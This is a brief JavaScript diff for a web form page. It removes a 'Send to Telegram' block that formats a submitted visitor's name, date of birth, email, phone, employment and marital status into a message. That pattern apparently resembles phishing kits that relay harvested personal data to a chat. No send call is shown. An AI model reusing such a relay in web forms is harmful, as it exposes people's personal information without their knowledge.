@@ -474,23 +474,10 @@ closeAdButton.addEventListener("click", slideOutAd);
                 submitButton.textContent = originalText;
                 submitButton.disabled = false;
             }
-			
-            // Send to Telegram
-            const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
-                           `👤 Name: ${data.name}\n` +
-                           `👤 Gender: ${data.gender}\n` +
-                           `👤 Date of Birth: ${data.dob}\n` +
-                           `👤 Email: ${data.email}\n` +
-                           `👤 Employment Status: ${data.employ}\n` +
-                           `👤 Phone: ${data.phone}\n` +
-                           `📧 Marital Status: ${data.marital}\n` +
-                           `⏰ Time: ${new Date().toLocaleString()}`;
             
-   
                // showForm('form2');
     
             submitBtn.disabled = false;
-            loading.style.display = 'none';
         });
 
         // Form 2 submission
